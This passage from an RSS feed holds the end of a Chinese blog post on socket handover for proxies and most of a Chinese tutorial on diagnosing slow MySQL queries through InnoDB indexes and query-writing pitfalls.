data-tool=&quot;mdnice编辑器&quot;&gt;其实，在servicemesh的推进过程中，proxy的替换，也会使用类似的技术，比如SOFA。对于golang和C语言来说，由于API暴露的比较好，这种功能可以很容易的实现；但在Java中，却有不少的困难，因为Java的跨平台特性不会做这种为Linux定制的API。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;可以看到，sendmsg和recvmsg这两个函数，可以实现的功能非常的酷。它比较适合无状态的proxy服务，如果服务内有状态存留，这种迁移并不见得安全，当然也可以尝试把此项技术运用在一些中间件上。但无论如何，这种黑科技，有一种别样的暴力美，肯定会把windows server用户给馋哭的。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;作者简介：小姐姐味道 (xjjdog)，一个不允许程序员走弯路的公众号。聚焦基础架构和Linux。十年架构，日百亿流量，与你探讨高并发世界，给你不一样的味道。我的个人微信xjjdog0，欢迎添加好友，进一步交流。&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;strong&gt;推荐阅读：&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA4MTc4NTUxNQ==&amp;amp;action=getalbum&amp;amp;album_id=1551616798431690754#wechat_redirect&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;1. 玩转Linux&lt;/a&gt;&lt;br/&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA4MTc4NTUxNQ==&amp;amp;action=getalbum&amp;amp;album_id=1339444055490592770#wechat_redirect&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;2. 什么味道专辑&lt;/a&gt;&lt;/p&gt;&lt;p&gt;3. &lt;a target=&quot;_blank&quot; href=&quot;https://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;amp;mid=2650521059&amp;amp;idx=1&amp;amp;sn=d6742140c684f16cb4435508bdb5a418&amp;amp;scene=21#wechat_redirect&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;蓝牙如梦&lt;/a&gt;&lt;br/&gt;4. &lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;amp;mid=2650520865&amp;amp;idx=1&amp;amp;sn=ff7a751a092000a9aec8e47df35ab25a&amp;amp;chksm=8780bae5b0f733f3bd75575ef9c14e548bd833bf2ba1289b6f77fd0bbcc5fbc264c19c8cb04a&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;杀机！&lt;/a&gt;&lt;br/&gt;5. &lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;amp;mid=2650521932&amp;amp;idx=1&amp;amp;sn=2a171aaaeb1e6124c86f39a46075363c&amp;amp;chksm=8780c688b0f74f9e25baf3495883dfe50541068dc4e4c1ae8d45ead7daee208a94563af74312&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;失联的架构师，只留下一段脚本&lt;/a&gt;&lt;br/&gt;6. &lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;amp;mid=2650521617&amp;amp;idx=1&amp;amp;sn=86e4bee100fa78ccc94e24bb27f0e71a&amp;amp;chksm=8780c7d5b0f74ec36bd0a06167f5b84777ecb2d48b57f3d96e3ce3c4575e6b777dda0188376f&amp;amp;scene=21#wechat_redirect&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;架构师写的BUG，非比寻常&lt;/a&gt;&lt;/p&gt;&lt;/section&gt;
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>8194308a28dd00d3c6f7196bff27a2b8</guid>
<title>慢 SQL 排查思路？就这</title>
<link>https://toutiao.io/k/xitokgg</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;今天和大家聊一个常见的问题：慢SQL。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过本文你将了解到以下内容：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;慢SQL的危害&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;SQL语句的执行过程&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;存储引擎和索引的那些事儿&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;慢SQL解决之道&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;后续均以MySQL默认存储引擎InnoDB为例进行展开，话不多说，开搞！&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;1.慢SQL的危害&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;慢SQL，就是跑得很慢的SQL语句，你可能会问慢SQL会有啥问题吗？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;试想一个场景：&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;大白和小黑端午出去玩，机票太贵于是买了高铁，火车站的人真是乌央乌央的。&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;马上检票了，大白和小黑准备去厕所清理下库存，坑位不多，排队的人还真不少。&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;小黑发现其中有3个坑的乘客贼慢，其他2个坑位换了好几波人，这3位坑主就是不出来。&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;等在外面的大伙，心里很是不爽，长期占用公共资源，后面的人没法用。&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;小黑苦笑道：这不就是厕所版的慢SQL嘛！&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这是实际生活中的例子，换到MySQL服务器也是一样的，毕竟科技源自生活嘛。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;MySQL服务器的资源(CPU、IO、内存等)是有限的，尤其在高并发场景下需要快速处理掉请求，否则一旦出现慢SQL就会阻塞掉很多正常的请求，造成大面积的失败/超时等。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.7542262678803641&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawKIx7Ap2Bfx9G5kxrH9wMxUOAGoJEthtictIjPvwyAUmk9vCQEJVicyxA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1538&quot;/&gt;&lt;/figure&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;2.SQL语句执行过程&lt;/span&gt;&lt;/h2&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.3701188455008489&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawvAsmfEicYvbEJicic3Zw3Ud8icpIqm5e8xVH5vAEkPUkzEkUbeQ0CUEpZQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1178&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;客户端和MySQL服务端的交互过程简介：&lt;/p&gt;&lt;ol data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;客户端发送一条SQL语句给服务端，服务端的连接器先进行账号/密码、权限等环节验证，有异常直接拒绝请求。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;服务端查询缓存，如果SQL语句命中了缓存，则返回缓存中的结果，否则继续处理。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;服务端对SQL语句进行词法解析、语法解析、预处理来检查SQL语句的合法性。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;服务端通过优化器对之前生成的解析树进行优化处理，生成最优的物理执行计划。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;将生成的物理执行计划调用存储引擎的相关接口，进行数据查询和处理。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;处理完成后将结果返回客户端。&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;客户端和MySQL服务端的交互过程简图：&lt;img data-ratio=&quot;1.138095238095238&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawCB9kKgFQd2GrOsuGfXszyoH4VZBEzSEOODJcyc0WUQ6a2kgR7k3Jkw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1260&quot;/&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;俗话说&quot;条条大路通罗马&quot;，优化器的作用就是找到这么多路中最优的那一条。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;存储引擎更是决定SQL执行的核心组件，适当了解其中原理十分有益。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;3. 存储引擎和索引的那些事儿&lt;/span&gt;&lt;/h2&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;3.1 存储引擎&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;InnoDB存储引擎(Storage Engine)是MySQL默认之选，所以非常典型。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;存储引擎的主要作用是进行数据的存取和检索，也是真正执行SQL语句的组件。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;InnoDB的整体架构分为两个部分：内存架构和磁盘架构，如图：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.76875&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawfb1drqp3TbIRyP2cCf6mGMDkVq98oaVOXibG7mtT1u02K0NJrupBQAQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;640&quot;/&gt;&lt;/figure&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;存储引擎的内容非常多，并不是一篇文章能说清楚的，本文不过多展开，我们在此只需要了解内存架构和磁盘架构的大致组成即可。&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;InnoDB 引擎是面向行存储的，数据都是存储在磁盘的数据页中，数据页里面按照固定的行格式存储着每一行数据。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;行格式主要分为四种类型Compact、Redundant、Dynamic和Compressed，默认为Compact格式。&lt;/p&gt;&lt;/blockquote&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.3352941176470588&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawHM0bYBZibKpjUnIBh96avgob6ImMts8IUrUp4meU3kSvZgvQXKIS18A/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1360&quot;/&gt;&lt;/figure&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;磁盘预读机制和局部性原理&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;当计算机访问一个数据时，不仅会加载当前数据所在的数据页，还会将当前数据页相邻的数据页一同加载到内存，磁盘预读的长度一般为页的整倍数，&lt;span&gt;从而有效降低磁盘IO的次数。&lt;/span&gt;&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.5628834355828221&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawzADXHbHgXLrRvzTo6riacibYCuc6j9iaJVD8UAanYz8SzqUcqD0IS93cA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1304&quot;/&gt;&lt;/figure&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;磁盘和内存的交互&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;MySQL中磁盘的数据需要被交换到内存，才能完成一次SQL交互，大致如图：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.5955414012738853&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawuuDwcNhjLLYYNrica4icc1Hs92j2gLSUsdVFIn4Pia6XkGq2lPop6wHmw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1256&quot;/&gt;&lt;/figure&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;扇区是硬盘的读写的基本单位，通常情况下每个扇区的大小是 512B&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;磁盘块文件系统读写数据的最小单位，相邻的扇区组合在一起形成一个块，一般是4KB&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;页是内存的最小存储单位，页的大小通常为磁盘块大小的 2^n 倍&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;InnoDB页面的默认大小是16KB，是数倍个操作系统的页&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.5098039215686274&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawQcR5UBxgWJluY8rDsG1UbnabFia04265Pns6AicQticic2WIXJahNE0t0A/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;918&quot;/&gt;&lt;/figure&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;随机磁盘IO&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;MySQL的数据是一行行存储在磁盘上的，并且这些数据并非物理连续地存储，这样的话要查找数据就无法避免随机在磁盘上读取和写入数据。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;对于MySQL来说，当出现大量磁盘随机IO时，大部分时间都被浪费到寻道上，磁盘呼噜呼噜转，就是传输不了多少数据。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;一次磁盘访问由三个动作组成：&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;寻道：磁头移动定位到指定磁道&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;旋转：等待指定扇区从磁头下旋转经过&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;数据传输：数据在磁盘与内存之间的实际传输&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;对于存储引擎来说，如何有效降低随机IO是个非常重要的问题。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;3.2 索引&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;可以实现增删改查的数据结构非常多，包括：哈希表、二叉搜索树、AVL、红黑树、B树、B+树等，这些都是可以作为索引的候选数据结构。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;结合MySQL的实际情况：磁盘和内存交互、随机磁盘IO、排序和范围查找、增删改的复杂度等等，综合考量之下B+树脱颖而出。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;B+树作为多叉平衡树，对于范围查找和排序都可以很好地支持，并且更加矮胖，访问数据时的平均磁盘IO次数取决于树的高度，因此B+树可以让磁盘的查找次数更少。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在InnoDB中B+树的高度一般都在2~4层，并且根节点常驻内存中，也就是说查找某值的行记录时最多只需要1~3次磁盘I/O操作。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;MyISAM是将数据和索引分开存储的，InnoDB存储引擎的数据和索引没有分开存储，这也就是为什么有人说Innodb索引即数据，数据即索引，如图：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.4496951219512195&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawXEfGDDbZyicTohgDN9B9QEOOW2VcHRltqJyshFNkPFxgC1via6ksic6JQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1312&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;说到InnoDB的数据和索引的存储，就提到一个名词：&lt;strong&gt;聚集索引&lt;/strong&gt;。&lt;/p&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;聚集索引&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;聚集索引将索引和数据完美地融合在一起，是每个Innodb表都会有的一个特殊索引，一般来说是借助于表的主键来构建的B+树。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;假设我们有student表，将id作为主键索引，那么聚集索引的B+树结构，如图：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.5038051750380518&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawTxntAYMkhaT4mp2Xb7oPJXxMC9lUd7qfqbBcX3PqXiaz2NbsngubJJA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1314&quot;/&gt;&lt;/figure&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;非叶子节点不存数据，只有主键和相关指针&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;叶子节点包含主键、行数据、指针&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;叶子节点之间由双向指针串联形成有序双向链表，叶子节点内部也是有序的&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;聚集索引按照如下规则创建：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;有主键时InnoDB利用主键来生成&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;没有主键，InnoDB会选择一个非空的唯一索引来创建&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;无主键且非NULL唯一索引时，InnoDB会隐式创建一个自增的列来创建&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;假如我们要查找id=10的数据，大致过程如下：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;索引的根结点在内存中，10&amp;gt;9 因此找到P3指针&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;P3指向的数据并没有在内存中，因此产生1次磁盘IO读取磁盘块3到内存&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;在内存中对磁盘块3进行二分查找，找到ID=9的全部值&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;非聚集索引&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;非聚集索引的叶子节点中存放的是二级索引值和主键键值，非叶子节点和叶子节点都没有存储整行数据值。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;假设我们有student表，将name作为二级索引，那么非聚集索引的B+树结构，如图：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.4888558692421991&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawcfyMslw9iayvVYUmA00ia3xQgP1NRefw2oIWBRhSbqomtK8icuibOC7eiaQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1346&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;由于非聚集索引的叶子节点没有存储行数据，如果通过非聚集索引来查找非二级索引值，需要分为两步：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;第一：通过非聚集索引的叶子节点来确定数据行对应的主键&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;第二：通过相应的主键值在聚集索引中查询到对应的行记录&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们把通过非聚集索引找到主键值，再根据主键值从聚集索引找对于行数据的过程称为：&lt;strong&gt;回表查询&lt;/strong&gt;。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;换句话说：select * from student where name = &#x27;Bob&#x27; 将产生回表查询，因为在name索引的叶子节点没有其他值，只能从聚集索引获得。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;所以如果查找的字段在非聚集索引就可以完成，就可以避免一次回表过程，这种称为：覆盖索引，所以select * 并不是好习惯，需要什么拿什么就好。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;假如我们要查找name=Tom的记录的所有值，大致过程如下：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;从非聚集索引开始，根节点在内存中，按照name的字典序找到P3指针&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;P3指针所指向的磁盘块不在内存中，产生1次磁盘IO加载到内存&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;在内存中对磁盘块3的数据进行搜索，获得name=tom的记录的主键值为4&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;根据主键值4从聚集索引的根节点中获得P2指针&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;P2指针所指向的磁盘块不在内存中，产生第2次磁盘IO加载到内存&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;将上一步获得的数据，在内存中进行二分查找获得全部行数据&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;上述查询就包含了一次回表过程，因此性能比主键查询慢了一倍，因此尽量使用主键查询，一次完事。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;4. 慢SQL解决思路&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;出现慢SQL的原因很多，我们抛开单表数亿记录和无索引的特殊情况，来讨论一些更有普遍意义的慢SQL原因和解决之道。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们从两个方面来进行阐述：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.33779761904761907&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/wAkAIFs11qaMZss2ia9Bx0yJNIfuKRhiawibEssFkqTicicyicMbibAPy4NoZk2dKJvHUZLSnVldt6PtQzkAo4c5cd6VA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1344&quot;/&gt;&lt;/figure&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;4.1 索引设置原则&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;程序员的角度和存储引擎的角度是不一样的，索引写的好，SQL跑得快。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;假如表中有1000w记录，其中有status字段表示状态，可能90%的数据status=1，可以不将status作为索引，因为其对数据记录区分度很低。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;每个索引都需要占用磁盘空间，修改表数据时会对索引进行更新，索引越多，更新越复杂。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;因为每添加一个索引，.ibd文件中就需要多维护一个B+Tree索引树，如果某一个table中存在10个索引，那么就需要维护10棵B+Tree，写入效率会降低，并且会浪费磁盘空间。&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果某个字段经常用来做查询条件，那么该字段的查询速度会影响整个表的查询速度，属于热门字段，为其建立索引非常必要。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;对于需要经常使用ORDER BY、GROUP BY、DISTINCT和UNION等操作的字段建立索引，可以有效借助B+树的特性来加速执行。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;主键可以用来创建聚集索引，外键也是唯一的且常用于表关联的字段，也需要建索引来提高性能。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;4.2 SQL的优化&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果数据库表的索引设置比较合理，SQL语句书写不当会造成索引失效，甚至造成全表扫描，迅速拉低性能。&lt;/p&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;索引失效&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们在写SQL的时候在某些情况下会出现索引失效的情况：&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;select id from std upper(name) = &#x27;JIM&#x27;;&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;select id from std where id+1=10;&lt;/p&gt;&lt;/blockquote&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;strong&gt;对索引使用&amp;lt;&amp;gt; 、not in 、not exist、!=&lt;/strong&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;select id from std where name != &#x27;jim&#x27;;&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;select id from std name like &#x27;%jim&#x27;;&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;比如：字符串类型索引字段不加引号，select id from std name = 100;保持变量类型与字段类型一致&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;并不是所有的or都会使索引失效，如果or连接的所有字段都设置了索引，是会走索引的，一旦有一个字段没有索引，就会走全表扫描。&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;联合索引包含key1，key2，key3三列，但SQL语句没有key1，根据联合索引的最左匹配原则，不会走联合索引。&lt;br/&gt;select name from table where key2=1 and key3=2;&lt;/p&gt;&lt;/blockquote&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;好的建议&lt;/h4&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;对于数据库来说，在绝大部分情况下，连接会比子查询更快，使用连接的方式，MySQL优化器一般可以生成更佳的执行计划，更高效地处理查询&lt;br/&gt;而子查询往往需要运行重复的查询，子查询生成的临时表上也没有索引， 因此效率会更低。&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote 